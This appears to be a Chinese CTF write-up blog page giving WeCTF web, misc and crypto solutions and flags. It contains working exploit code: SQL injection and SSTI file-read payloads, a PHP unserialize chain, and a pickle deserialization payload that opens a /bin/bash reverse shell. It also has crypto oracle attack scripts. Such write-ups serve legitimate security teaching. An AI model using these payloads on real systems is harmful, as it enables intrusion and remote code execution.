<html>

<head>
    <meta charset="utf-8" />
<meta name="description" content="" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>
    Wectf1--WriteUp | We_ax
</title>
<link rel="shortcut icon" href="https://we-ax.github.io/favicon.ico?v=1570368166577">
<!-- <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous"> -->
<link href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
<link rel="stylesheet" href="https://we-ax.github.io/styles/main.css">
<!-- js -->
<script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
<script src="https://we-ax.github.io/media/js/jquery.sticky-sidebar.min.js"></script>
<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
<script src="https://cdn.bootcss.com/moment.js/2.23.0/moment.min.js"></script>


        
</head>

<body>
    <div class="main">
        <div class="header">
    <div class="nav">
        <div class="logo">
            <a href="https://we-ax.github.io">
                <img class="avatar" src="https://we-ax.github.io/images/avatar.png?v=1570368166577" alt="">
            </a>
            <div class="site-title">
                <h1>
                    We_ax
                </h1>
            </div>
        </div>
        <span class="menu-btn fa fa-align-justify"></span>
        <div class="menu-container">
            <ul>
                
                    
                            <li>
                                <a href="/" class="menu">
                                    首页
                                </a>
                            </li>
                            
                                
                    
                            <li>
                                <a href="/archives" class="menu">
                                    归档
                                </a>
                            </li>
                            
                                
                    
                            <li>
                                <a href="/tags" class="menu">
                                    标签
                                </a>
                            </li>
                            
                                
                    
                            <li>
                                <a href="/post/about" class="menu">
                                    关于
                                </a>
                            </li>
                            
                                
            </ul>
        </div>
    </div>
</div>

<script>
    $(document).ready(function() {
        $(".menu-btn").click(function() {
            $(".menu-container").slideToggle();
        });
        $(window).resize(function() {

            if (window.matchMedia('(min-width: 960px)').matches) {
                $(".menu-container").css('display', 'block')
            } else {
                $(".menu-container").css('display', 'none')
            }

        });
    });
</script>

            <div id="main-content" class="post-detail main-container">
                <!-- left -->
                <div id="content" class="main-container-left">
                    <article class="post i-card">
                        <h2 class="post-title">
                            Wectf1--WriteUp
                        </h2>
                        <div class="post-info">
                            <time class="post-time">2019-10-06</time>
                            
                                <a href="https://we-ax.github.io/tag/4REPgFG5c" class="post-tag i-tag
                            i-tag-primary">
                            #writeup
                        </a>
                                
                        </div>
                        
                            <div class="post-feature-image" style="background-image: url('https://api.ixiaowai.cn/mcapi/mcapi.php')"></div>
                            
                                <div class="post-content">
                                    <p>Welcome to the first of WeCTF</p>
<!-- more -->
<h1 id="web">Web</h1>
<p>Web题目中至少2道题考代码审计。</p>
<h2 id="web签到">web签到</h2>
<p><a href="http://119.23.236.68:63006/web1/index.php">http://119.23.236.68:63006/web1/index.php</a><br>
查看源代码<br>
wectf{the_iiiis_flag}</p>
<h2 id="easy01">easy01</h2>
<p><a href="http://119.23.236.68:63006/easy/index.php">http://119.23.236.68:63006/easy/index.php</a><br>
源码提示 get name == wectf<br>
payload ： <a href="http://119.23.236.68:63006/easy/index.php?name=wectf">http://119.23.236.68:63006/easy/index.php?name=wectf</a><br>
wectf{1e2e3c4a5d6c123d456eaec456789f}</p>
<h2 id="easy02">easy02</h2>
<p><a href="http://119.23.236.68:63006/web2/index.php">http://119.23.236.68:63006/web2/index.php</a><br>
XFF 伪造 127.0.0.1<br>
wectf{X_FORWARDED_FOR_is}</p>
<h2 id="easy03">easy03</h2>
<p><a href="http://119.23.236.68:63006/web4/index.php">http://119.23.236.68:63006/web4/index.php</a><br>
抓包，header<br>
wectf{header_must_be_win}</p>
<h2 id="medium01">medium01</h2>
<p><a href="http://119.23.236.68:63006/web3/index.php">http://119.23.236.68:63006/web3/index.php</a></p>
<pre><code>&lt;?php 
highlight_file(&quot;source.php&quot;); 
if(isset($_GET['a'])) 
{ 
    $a = trim($_GET['a']); 
    if($a&gt;999999 and strlen($a)&lt;5) 
    { 
        echo &quot;wectf{xxxxxxxxxxxxxxx}&quot;; 
    } 
} 
?&gt;
</code></pre>
<p>payload : <a href="http://119.23.236.68:63006/web3/index.php?a=1e9">http://119.23.236.68:63006/web3/index.php?a=1e9</a><br>
wectf{eeeeeeeee_is_low}</p>
<h2 id="medium02">medium02</h2>
<p><a href="http://119.23.236.68:63006/web5/index.php">http://119.23.236.68:63006/web5/index.php</a></p>
<pre><code>&lt;?php
error_reporting(0);
highlight_file(&quot;source.php&quot;);
$name = $_COOKIE['pass'];
if($name == &quot;password&quot;)
{
    extract($_POST);
    if($name == &quot;isnotonly&quot;)
    {
        echo &quot;wectf{xxxxxxxxxxxxxx}&quot;;
    }
}
?&gt;
</code></pre>
<p>payload：</p>
<pre><code>curl http://119.23.236.68:63006/web5/index.php --cookie &quot;pass=password&quot; --data &quot;name=isnotonly&quot;
</code></pre>
<p>wectf{flag_1s_here}</p>
<h2 id="medium03">medium03</h2>
<p><a href="http://119.23.236.68:63006/medium/index.php">http://119.23.236.68:63006/medium/index.php</a></p>
<pre><code>&lt;?php 
highlight_file('source.php'); 
error_reporting(0); 
$flag = 'wectf{xxxxxxxxxxxxxxxx}'; 
if (isset($_GET['name']) and isset($_GET['username']) and isset($_POST['password'])) { 
    if ($_GET['username'] == $_POST['password']){ 
        die('exit'); 
    } 
    else if(sha1($_GET['username']) === sha1($_POST['password'])) 
    { 
        $name = urldecode($_GET['name']); 
        if ($name === 'wectf!@#$wectf') 
        { 
            die('Flag: '.$flag); 
        } 
    } 
} 
?&gt; 
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://uploader.shimo.im/f/qFFov8PET2kCcd9Y.png!thumbnail" alt="图片"></figure>
<p>wectf{e2e123acef456789d132f456c13}</p>
<h2 id="high01">high01</h2>
<p><a href="http://119.23.236.68:63006/high/index.php">http://119.23.236.68:63006/high/index.php</a></p>
<pre><code>import requests
import base64
import string

s = requests.session()
url = &quot;http://119.23.236.68:63006/high/index.php&quot;

header = {'User-Agent': 'Kylinbrowser',
'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
'Accept-Encoding': 'gzip, deflate',
'Referer': 'http://119.23.236.68:63006/high/index.php',
'Content-Type': 'application/x-www-form-urlencoded',
'Content-Length': '29',
'Connection': 'close',
'Upgrade-Insecure-Requests': '1'}
bdata = {
    'username':&quot;admin&quot;,
    'password':&quot;admin' or '2'&gt;'1&quot;
}
base = s.post(url,headers=header,data=bdata).text

flag = &quot;&quot;
# while True:
for i in &quot;{}0123456789abcdefghijklmnopqrstuvwxyz&quot;:
    try:
        data = {
            'username':&quot;admin&quot;,
            'password':&quot;admin' or '2'&gt;'1' union select 1,'ad','%s' order by 3,'1&quot; % i
        }
        html = s.post(url,headers=header,data=data).text
        print(i,html)
    except:
</code></pre>
<p>pass</p>
<p>wectf{this_15s_high_inject}</p>
<h2 id="high02">high02</h2>
<p><a href="http://119.23.236.68:63007/">http://119.23.236.68:63007/</a><br>
提示： flag.txt 在根目录下，直接读就好<br>
payload：<br>
<a href="http://119.23.236.68:63007/?name=">http://119.23.236.68:63007/?name=</a>{{().<strong>class</strong>.<strong>bases</strong>[0].<strong>subclasses</strong>()[177].<strong>init</strong>.<strong>globals</strong>.<strong>builtins</strong><a href="%27/flag.txt%27">%27open%27</a>.read()}}</p>
<p>wectf{what_a_easy_ssti}</p>
<h2 id="high03">high03</h2>
<p><a href="http://119.23.236.68:63008/">http://119.23.236.68:63008/</a><br>
提示： flag.txt 在根目录下<br>
给源码：<br>
<a href="https://uploader.shimo.im/f/ckOeQiep4k0UDRV1.py">app.py</a></p>
<pre><code>import requests
import pickle
import os
class exp(object):
    def __reduce__(self):
        payload = &quot;&quot;&quot;python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;127.0.0.1&quot;,6300));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);'&quot;&quot;&quot;
        return (os.system,(payload,))
e = exp()
s = pickle.dumps(e)
print(s)
data = {
    'a':s
}
html = requests.post(&quot;http://119.23.236.68:63008/&quot;,data=data).content
print(html)
</code></pre>
<p>wectf{just_fanxuliehua_python}</p>
<h2 id="crazy01">crazy01</h2>
<p><a href="http://119.23.236.68:63006/crazy01/index.php">http://119.23.236.68:63006/crazy01/index.php</a><br>
题目描述：就是一个php反序列化</p>
<pre><code>##exp.php
&lt;?php
class O00O
{
        public $value;
        public function __construct()
        {
                $this-&gt;value = new Call();
        }
        public function __destruct()
        {
                $this-&gt;value-&gt;func1();
        }
}
class Call
{
        public $value;
        public function __construct()
        {
                $this-&gt;value = new Func_t();
        }
        public function func1()
    {
            $this-&gt;value-&gt;func2();
    }
}
class Func_t
{
        public $value;
        public function __construct()
        {
                $this-&gt;value = new Func_m();
        }
        public function __call($func2,$a)
        {
                $func = $this-&gt;value;
                $func();
        }
}
class Func_m
{
        public $value1;
        public $value2;
        public function __construct()
        {
                $this-&gt;value1 = new Ina();
        }
        public function __invoke()
        {
                $this-&gt;value2 = &quot;flag&quot;.$this-&gt;value1;
        } 
}
class Ina
{
        public $value;
        public function __construct()
        {
                $this-&gt;value = new GetFlag();
        }
        public function __toString()
        {
                $this-&gt;value-&gt;get_flag();
                return &quot;1&quot;;
        }
}
class GetFlag
{
    public function get_flag()
    {
        echo &quot;flag{xxxxxxxxxxxxxxxxx}&quot;;
    }
}
$b = new O00O;                                       
echo urlencode(serialize($b)).&quot;&lt;br /&gt;&quot;;       
</code></pre>
<p>生成payload：</p>
<pre><code>O%3A4%3A%22O00O%22%3A1%3A%7Bs%3A5%3A%22value%22%3BO%3A4%3A%22Call%22%3A1%3A%7Bs%3A5%3A%22value%22%3BO%3A6%3A%22Func_t%22%3A1%3A%7Bs%3A5%3A%22value%22%3BO%3A6%3A%22Func_m%22%3A2%3A%7Bs%3A6%3A%22value1%22%3BO%3A3%3A%22Ina%22%3A1%3A%7Bs%3A5%3A%22value%22%3BO%3A7%3A%22GetFlag%22%3A0%3A%7B%7D%7Ds%3A6%3A%22value2%22%3BN%3B%7D%7D%7D%7D
</code></pre>
<p><img src="https://uploader.shimo.im/f/SrxNjaLt79IRKN4C.png!thumbnail" alt="图片"><br>
flag{unserialize_php_O00O}</p>
<h1 id="misc">Misc</h1>
<h2 id="rot13签到题">ROT13（签到题）</h2>
<p>rot13 编码，我相信你能找到解码方式</p>
<pre><code>flag = &quot;xxxxxxxxxxxxxxxx&quot;
print flag.encode('rot13')
#jrpgs{E0g13_fb_rnfl_jr1p0zr_gb_jrpgs}
</code></pre>
<p>flag：wectf{R0t13_so_easy_we1c0me_to_wectf}</p>
<h2 id="贝斯家族">贝斯家族</h2>
<p>你听说过大名鼎鼎的贝斯（base）家族吗？<br>
4D515A464D32544549354E444F574C4B4B4A35465556525950424D57594F4B474A565744514D535A4C415944323D3D3D</p>
<p>源码：</p>
<pre><code>flag = '××××××××××××××'
print base64.b16encode(base64.b32encode(base64.b64encode(flag)))
#4D515A464D32544549354E444F574C4B4B4A35465556525950424D57594F4B474A565744514D535A4C415944323D3D3D
</code></pre>
<p>flag  :  wectf{b4se_1b_E2_6a}</p>
<h2 id="ascii码">ASCII码</h2>
<p>听说过 ASCII 码吗，试试解码这个，仔细看 ASCII 码表<br>
77656374667b315f346d5f66346b655f08080808085f666c34677d</p>
<p>源码：</p>
<pre><code>enc = 'wectf{1_4m_f4ke_\b\b\b\b\bfl4g}'.encode('hex')
print enc
#77656374667b315f346d5f66346b655f08080808085f666c34677d
</code></pre>
<p>其实这个就是玩了一点花样，0x08 是退格，5个退格就把 f4ke_ 删掉，就是真的 flag<br>
flag : wectf{1_4m_fl4g}</p>
<h2 id="babypcap">babypcap</h2>
<p><a href="https://uploader.shimo.im/f/1nduCzbrEskIqwBz.pcap">goodluck.pcap</a></p>
<p>我通过 nc 把 flag 从 192.168.229.1 发送到 192.168.229.128<br>
进去跟踪 tcp 流就能看到flag<br>
<img src="https://uploader.shimo.im/f/qmyoGJIrXqcrIPkL.png!thumbnail" alt="图片"><br>
flag : wectf{4maz1n9_pcap}<br>
.........</p>
<h2 id="这是个啥东西">这是个啥东西</h2>
<p>你知道 png 文件的文件格式吗？<br>
<a href="https://uploader.shimo.im/f/JGCOduTmNGIyhF8i.zip">WECTF.png.zip</a></p>
<p>flag：wectf{pn9_h4s_n0_he4d}<br>
这个题目我去掉了 png 的文件头</p>
<pre><code>89 50 4E 47 0D 0A 1A 0A
</code></pre>
<p>https://ctf-wiki.github.io/ctf-wiki/misc/picture/png-zh/)</p>
<h2 id="whoami">whoami</h2>
<p>whoami.py：</p>
<pre><code>tmp = ''
enc = '\xfc\xfe`\xec\xf8\xe2\xee`\xf0\xf2\xe2\xf0\xf2\xe2\xf0\xf2\xe2'
flag = input(&quot;flag :&quot;)
for i in flag:
    tmp += chr((ord(i) * 2 ^ 0x20))

if tmp == enc:
    print(&quot;you get it, but......&quot;)
else:
    print(&quot;error!&quot;)

tmp = ''
enc = '\xfc\xfe`\xec\xf8\xe2\xee`\xf0\xf2\xe2\xf0\xf2\xe2\xf0\xf2\xe2'
flag = input(&quot;flag :&quot;)
for i in flag:
    tmp += chr((ord(i) * 2 ^ 0x20))

if tmp == enc:
    print(&quot;you get it, but......&quot;)
else:
    print(&quot;error!&quot;)


tmp = ''
enc = '\xfc\xfe`\xec\xf8\xe2\xee`\xf0\xf2\xe2\xf0\xf2\xe2\xf0\xf2\xe2'
flag = input(&quot;flag :&quot;)
for i in flag:
    tmp += chr((ord(i) * 2 ^ 0x20))

if tmp == enc:
    print(&quot;you get it, but......&quot;)
else:
    print(&quot;error!&quot;)

tmp = ''
enc = '\xfc\xfe`\xec\xf8\xe2\xee`\xf0\xf2\xe2\xf0\xf2\xe2\xf0\xf2\xe2'
flag = input(&quot;flag :&quot;)
for i in flag:
    tmp += chr((ord(i) * 2 ^ 0x20))

if tmp == enc:
    print(&quot;you get it, but......&quot;)
else:
    print(&quot;error!&quot;)

tmp = ''
enc = '\xfc\xfe`\xec\xf8\xe2\xee`\xf0\xf2\xe2\xf0\xf2\xe2\xf0\xf2\xe2'
flag = input(&quot;flag :&quot;)
for i in flag:
    tmp += chr((ord(i) * 2 ^ 0x20))

if tmp == enc:
    print(&quot;you get it, but......&quot;)
else:
    print(&quot;error!&quot;)

tmp = ''
enc = '\xfc\xfe`\xec\xf8\xe2\xee`\xf0\xf2\xe2\xf0\xf2\xe2\xf0\xf2\xe2'
flag = input(&quot;flag :&quot;)
for i in flag:
    tmp += chr((ord(i) * 2 ^ 0x20))

if tmp == enc:
    print(&quot;you get it, but......&quot;)
else:
    print(&quot;error!&quot;)
</code></pre>
<p>足够长<br>
然后用 python3.6 编译成 pyc<br>
whoami.pyc<br>
<a href="https://uploader.shimo.im/f/IIaprIMkQZ4sK0fA.pyc">whoami.cpython-36.pyc</a></p>
<p>解出这个并没有什么用，因为 flag 不在代码里面<br>
用这个 <a href="https://github.com/AngelKitty/stegosaurus">https://github.com/AngelKitty/stegosaurus</a> 隐写</p>
<pre><code>python3.6 stegosaurus.py whoami.cpython-36.pyc -s --payload &quot;you get it wectf{stegosaurus_g00d}&quot;
</code></pre>
<p>解出 flag：</p>
<pre><code>python3.6 stegosaurus.py -x whoami.cpython-36.pyc
</code></pre>
<h2 id="钛合金狗眼">钛合金狗眼</h2>
<p>拿到图片首先binwalk跑一下，发现图片之后，一句foremost直接分离<br>
<img src="https://uploader.shimo.im/f/XiyYilVEgO4fhRJZ.png!thumbnail" alt="图片"><br>
放大第二张图片之后发现整齐的噪点，可以推测通道里面藏着信息<br>
百度搜索关键词： CTF 两张图片，得到某次比赛的wp<br>
<a href="http://blog.sina.com.cn/s/blog_9cd8465f0102v6ok.html">http://blog.sina.com.cn/s/blog_9cd8465f0102v6ok.html</a><br>
按照网上的答案，写脚本进行比较：<br>
<img src="https://uploader.shimo.im/f/PK5VXgJQIgkRnW7b.png!thumbnail" alt="图片"><br>
发现与网上的题目差不多，比赛那题是red通道隐藏信息，这题是blue通道隐藏信息。<br>
再继续写代码把blue通道里面隐藏的信息提取出来<br>
<img src="https://uploader.shimo.im/f/KL02lTGYcBId009o.png!thumbnail" alt="图片"><br>
得到一串长度为2809的二进制数样子的字符串，即53<em>53<br>
接下来创建一个53</em>53像素的图片， 将1和0转化为黑色像素点和白色像素点<br>
<img src="https://uploader.shimo.im/f/vKLYLu2BoJoGpJ7W.png!thumbnail" alt="图片"><br>
 <img src="https://uploader.shimo.im/f/Osip17ndRQgkqMv3.png!thumbnail" alt="图片"><br>
得到一张二维码图片，但是并不能扫出来<br>
再另外建立一张同样大小的图片，然后将该图片行列转置，保存在新图中<br>
 <img src="https://uploader.shimo.im/f/0uEsykDttMkuh2vC.png!thumbnail" alt="图片"><br>
<img src="https://uploader.shimo.im/f/w759iDlVMCUxO3x6.png!thumbnail" alt="图片"><br>
用手机扫描转置后的图片，得到flag<br>
flag{8fgd2svxc6zbikyt4}</p>
<h2 id=""></h2>
<h2 id="sksteg">SKsteg</h2>
<p><a href="https://uploader.shimo.im/f/3Awqct4fpN4RhP1O.zip">babySteg.zip</a></p>
<p>encode.py:</p>
<pre><code>from PIL import Image

def banner():
    bnr = '''
:'######::'##:::'##::'######::'########:'########::'######:::
'##... ##: ##::'##::'##... ##:... ##..:: ##.....::'##... ##::
 ##:::..:: ##:'##::: ##:::..::::: ##:::: ##::::::: ##:::..:::
. ######:: #####::::. ######::::: ##:::: ######::: ##::'####:
:..... ##: ##. ##::::..... ##:::: ##:::: ##...:::: ##::: ##::
'##::: ##: ##:. ##::'##::: ##:::: ##:::: ##::::::: ##::: ##::
. ######:: ##::. ##:. ######::::: ##:::: ########:. ######:::
:......:::..::::..:::......::::::..:::::........:::......::::
author：We_ax--Scriptkiddies
    '''
    print(bnr)

def str_convert_bin(s):
    result = ''
    for c in s:
        b = bin(ord(c)).replace('0b', '')
        b = '0' * (7 - len(b)) + b
        result = result + b
    return result

def insert(im, bin1):
    size = im.size
    length = len(bin1)
    print(length)
    k = 0
    flag = 0
    for i in range(1, size[0]):
        for j in range(size[1]):
            idx = (i * j) % 3
            pixel = bin(im.getpixel((i, j))[idx]).replace('0b', '')
            if idx == 0:
                if pixel[-1:] &lt; bin1[k]:
                    im.putpixel((i, j), (im.getpixel(
                        (i, j))[0] + 1, im.getpixel(
                            (i, j))[1], im.getpixel((i, j))[2]))
                if pixel[-1:] &gt; bin1[k]:
                    im.putpixel((i, j), (im.getpixel(
                        (i, j))[0] - 1, im.getpixel(
                            (i, j))[1], im.getpixel((i, j))[2]))
                k = k + 1
                if k == length:
                    flag = 1
                    break
            elif idx == 1:
                if pixel[-1:] &lt; bin1[k]:
                    im.putpixel((i, j), (im.getpixel(
                        (i, j))[0], im.getpixel(
                            (i, j))[1] + 1, im.getpixel((i, j))[2]))
                if pixel[-1:] &gt; bin1[k]:
                    im.putpixel((i, j), (im.getpixel(
                        (i, j))[0], im.getpixel(
                            (i, j))[1] - 1, im.getpixel((i, j))[2]))
                k = k + 1
                if k == length:
                    flag = 1
                    break
            elif idx == 2:
                if pixel[-1:] &lt; bin1[k]:
                    im.putpixel((i, j), (im.getpixel(
                        (i, j))[0], im.getpixel((i, j))[1], im.getpixel(
                            (i, j))[2] + 1))
                if pixel[-1:] &gt; bin1[k]:
                    im.putpixel((i, j), (im.getpixel(
                        (i, j))[0], im.getpixel((i, j))[1], im.getpixel(
                            (i, j))[2] - 1))
                k = k + 1
                if k == length:
                    flag = 1
                    break

        if flag == 1:
            break
    print(&quot;over\n\n&quot;)
    im.save(&quot;out.bmp&quot;)

def main():
    banner()
    test_str = input(&quot;flag :  &quot;)
    result = str_convert_bin(test_str)
    im = Image.open(&quot;in.bmp&quot;)
    insert(im, result)

if __name__ == '__main__':
    main()
</code></pre>
<p>decode.py：</p>
<pre><code>#-*- coding: utf-8 -*-
from PIL import Image
def bin_convert_str(b):
    str=''
    b1 = [b[i:i+7] for i in range(0, len(b), 7)]
    for i in range(len(b1)):
        b2 = chr(int(b1[i],2))
        str = str+b2
    return str

def extract(im,length):
    size = im.size
    k=0
    result=''
    flag=0

    for i in range(1, size[0]):
        for j in range(size[1]):
            idx = (i * j) % 3
            pixel_b=bin(im.getpixel((i,j))[idx]).replace('0b', '')
            result=result+pixel_b[-1:]
            k=k+1 

            if k==length:
                flag=1
                break
        if flag==1:
            break
    print(&quot;提取完成，二进制字符串为：\n%s&quot;%result)
    str = bin_convert_str(result)
    print(&quot;转换完成，结果为：\n%s&quot;%str)
im = Image.open('out.bmp')
extract(im, 200)
</code></pre>
<p>这个题目我就是魔改了传统的 lsb 隐写<br>
我把 flag 转成 bin<br>
第 k 个 bit 放在第 i * j 个像素点的 r 通道，第 k + 1 个 bit 放在第 i * j +1 个像素点 g 通道 ，第 k + 2 个 bit 放在第 i * j + 2个像素点 b 通道 ，一个像素点我只放一个 bit 而且 下一个像素点写入通道和前一个不一样， 这样 Stegsolve 或者现有的隐写工具 也没办法解出来，当时我还想打乱顺序 不是 RGB 顺序写入，而是随机写入 保存随机数，让他们根据随机数去读取对应位置的数据，想了想有点过分，还是算了<br>
这个题要是想解，老老实实写脚本，写完就了解 lsb 是个什么东西了<br>
<s>原本想用 c 出，写成逆向题的，但是想了想还是算了，出成逆向有点难了</s></p>
<p>flag：wectf{lsb_so_easy_hiahiahia}</p>
<h1 id="crypto">Crypto</h1>
<h2 id="签到">签到</h2>
<p>为了证明你的存在，Q群：930446586   flag在公告<br>
wectf{this_is_format_of_flag}</p>
<h2 id="guess">guess</h2>
<p>密文：U2FsdGVkX19x8Dq5FttochQw/lMz8C5gFD6PQjKZvtxBjb0Sab8cIqXqBpMne5vx<br>
明文：wectf{wectf_weCTF_WeCTF}<br>
解：<br>
这个题不给加密类型，base64 解码后可以看见 Salted ，判断是 AES<br>
无秘钥解出 flag<br>
解码网址  <a href="http://tools.jb51.net/password/aes_encode">http://tools.jb51.net/password/aes_encode</a></p>
<h2 id="cxkxcp">cxk=xcp</h2>
<p>给源文件：</p>
<pre><code>lowercase = &quot;abcdefghijklnmopqrstuvqxyz&quot;
uppercase = &quot;ABCDEFGHIJKLMNOPQRSTUVQXYZ&quot;
digest = &quot;0123456789&quot;
plaintext = &quot;what are you doing? you can join crypt group. flag is wectf{xxxxxxxxxxxxx}&quot;
ciphertext = &quot;&quot;
for i in range(len(plaintext)):
    if plaintext[i] in lowercase:
        enc = ord('a') + (ord('z') - ord(plaintext[i]))%26
    elif plaintext[i] in uppercase:
        enc = ord('A') + (ord('Z') - ord(plaintext[i]))%26
    elif plaintext[i] in digest:
        enc = ord('0') + (ord('9') - ord(plaintext[i]))%10
    else:
        enc = ord(plaintext[i])
    ciphertext += chr(enc)
print(ciphertext)
## ciphertext : wszg ziv blf wlrmt? blf xzm qlrm xibkg tilfk. uozt rh wvxgu{hzev_h5ev_nv}
</code></pre>
<p>加密即解密，将ciphertext代入plaintext再运行一次就得。<br>
wectf{save_s4ve_me}</p>
<h2 id="老套的md5">老套的md5</h2>
<p>小明又泼墨水了，墨水这次泼到 wectf 的flag上面了，明文中有三个字符被挡住了，巧的很，明文的md5值咱们知道，而且他没有被泼墨水，简单了把<br>
明文：wectf{ab?def?hijklm?opq}<br>
密文：84e7ab5946fb4c5d94ed891c42d5fac6</p>
<pre><code>import string
import hashlib

for i in string.ascii_lowercase:
    for j in string.ascii_lowercase:
        for k in string.ascii_lowercase:
            a = &quot;wectf{ab&quot;+i+&quot;def&quot;+j+&quot;hijklm&quot;+k+&quot;opq}&quot;
            c = hashlib.md5(a)
            b = c.hexdigest()
            if b == &quot;84e7ab5946fb4c5d94ed891c42d5fac6&quot;:
                print(a)
</code></pre>
<p>wectf{abzdefhhijklmlopq}</p>
<h2 id="babyrsa">babyRSA</h2>
<p>Rsa 是不可攻破的吗？</p>
<pre><code>from Crypto.Util.number import bytes_to_long
flag = raw_input(&quot;flag : &quot;)
tmp = bytes_to_long(flag)
n = 47966708183289639962501363163761864399454241691014467172805658518368423135168025285144721028476297179341434450931955275325060173656301959484440112740411109153032840150659
e = 3
c = pow(tmp, e, n)
if c == 1495572858946434740124351882099461657145759077753704214627609673423129831012766355967962871807110976347627163520955975614562262871102943487213224386685367602432775269:
    print &quot;you get it!&quot;
else:
    print &quot;Too Young, Too simple!&quot;
</code></pre>
<p>这个题目考的是最简单的 Rsa 小指数攻击</p>
<p>flag : wectf{rs4_e=3_n0T_s4fE}</p>
<p>exp:</p>
<pre><code>from Crypto.Util.number import *
import primefac
import gmpy2

def modinv(a,n):
    return primefac.modinv(a,n) % n
n=47966708183289639962501363163761864399454241691014467172805658518368423135168025285144721028476297179341434450931955275325060173656301959484440112740411109153032840150659
e=3
c=1495572858946434740124351882099461657145759077753704214627609673423129831012766355967962871807110976347627163520955975614562262871102943487213224386685367602432775269

i=0
while 1:
    if(gmpy2.iroot(c+i*n, 3)[1]==1):
        print long_to_bytes(gmpy2.iroot(c+i*n, 3)[0])
        break
    i=i+1
</code></pre>
<h2 id="-2"></h2>
<h2 id="脑筋急转弯">脑筋急转弯</h2>
<pre><code>import random
import time
import os
import sys
from Crypto.Cipher import DES

class Unbuffered(object):
   def __init__(self, stream):
       self.stream = stream
   def write(self, data):
       self.stream.write(data)
       self.stream.flush()
   def __getattr__(self, attr):
       return getattr(self.stream, attr)

#取消缓冲
sys.stdout = Unbuffered(sys.stdout)

#设定闹铃，5分钟进程自杀
import signal
signal.alarm(300)


flag=r&quot;wectf{baby_crypt0_DES}&quot;
hint = '''
Welcome to my world, where you can enter a string of characters to get a bunch of encrypted data, the things you want are in this string of data.
Encryption method: DES(&quot;your input&quot;+flag)
'''
print(hint)

key = os.urandom(8)

def des_cbc(key,m):
    handler=DES.new(key,DES.MODE_ECB)
    return handler.encrypt(m).encode(&quot;hex&quot;)

while True:
    input = raw_input(&quot;&gt;&gt; &quot;)
    token = input + flag
    tmp = len(token)/16
    token = token.ljust((tmp+1)*16,&quot;0&quot;)
    checksum=des_cbc(key,token)
    print(&quot;checksum: &quot;+checksum)
</code></pre>
<pre><code>##exp.py
import socket
import string
import time
def Checker(s):
    flag = &quot;&quot;
    strings = &quot;-_{}%/+=:&quot; + string.ascii_letters + string.digits
    for i in range(47,-1,-1):
        error = 1
        s.send(&quot;@&quot;*i + &quot;\n&quot;)
        temp = s.recv(2048)
        if &quot;checksum&quot; not in temp:
            temp = s.recv(1024)
        for k in strings:
            s.send(&quot;@&quot;*i + flag + k + &quot;\n&quot;)
            value = s.recv(1024)[:106]
            if &quot;checksum&quot; not in value:
                value = s.recv(1024)[:106]
            if value == temp[:106]:
                flag += k
                print(flag)
                error = 0
                break
        if error == 1:
            flag += &quot;@&quot;
            print(flag)


host = &quot;39.98.246.99&quot;
port = 11112
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((host, port))
banner = sock.recv(3048)
print(banner)
flagvalue = sock.recv(2048)
Checker(sock)
</code></pre>
<p>wectf{baby_crypt0_DES}</p>
<h2 id="attack-cbc">attack CBC</h2>
<pre><code>class Unbuffered(object):
   def __init__(self, stream):
       self.stream = stream
   def write(self, data):
       self.stream.write(data)
       self.stream.flush()
   def __getattr__(self, attr):
       return getattr(self.stream, attr)
import sys
sys.stdout = Unbuffered(sys.stdout)
import signal
signal.alarm(600)

import random
import time
flag=open(&quot;flag&quot;,&quot;r&quot;).read()

from Crypto.Cipher import AES
import os

def aes_cbc(key,iv,m):
    handler=AES.new(key,AES.MODE_CBC,iv)
    return handler.encrypt(m).encode(&quot;hex&quot;)
def aes_cbc_dec(key,iv,c):
    handler=AES.new(key,AES.MODE_CBC,iv)
    return handler.decrypt(c.decode(&quot;hex&quot;))

key=os.urandom(16)
iv=os.urandom(16)
session=os.urandom(8)
token=&quot;session=&quot;+session.encode(&quot;hex&quot;)+&quot;;admin=0&quot;
checksum=aes_cbc(key,iv,token)
print token+&quot;;checksum=&quot;+checksum
for i in range(10):
    token_rcv=raw_input(&quot;token:&quot;)
    if token_rcv.split(&quot;admin=&quot;)[1][0]=='1' and token_rcv.split(&quot;session=&quot;)[1][0:16].decode(&quot;hex&quot;)==session:
        c_rcv=token_rcv.split(&quot;checksum=&quot;)[1].strip()
        m_rcv=aes_cbc_dec(key,iv,c_rcv)
        print m_rcv
        if m_rcv.split(&quot;admin=&quot;)[1][0]=='1':
            print flag
</code></pre>
<p>CBC 加密就是把上一个块的密文当成下一个块的 IV<br>
<img src="https://uploader.shimo.im/f/ue0w8o3smu8DN8Py.png!thumbnail" alt="图片"></p>
<p>代码中</p>
<pre><code>if m_rcv.split(&quot;admin=&quot;)[1][0]=='1':
  print flag
</code></pre>
<p>就是检查了传回来的 token 是不 admin=1，等于 1 的话就印出 flag<br>
不会检查其他块是否能解密，这样我们修改上一个块的密文中 admin=0 的 0 的对应异或的那个字符把它 异或上 0 再异或上 1 就能达到修改 admin=1 的目的（注意这里的 0 和 1 是 char 不是 int）</p>
<p>运行的时候是这样的</p>
<pre><code>session=a84b3aee320ae1e2;admin=0;checksum=551d730d1e45de5033aecce896e874b1ab77327d9bcee3d3906ff29d95e5e0f7
token:
</code></pre>
<p>session=a84b3aee<br>
320ae1e2;admin=0</p>
<p>checksum：</p>
<pre><code>551d730d1e45de5033aecce896e874b1
ab77327d9bcee3d3906ff29d95e5e0f7
</code></pre>
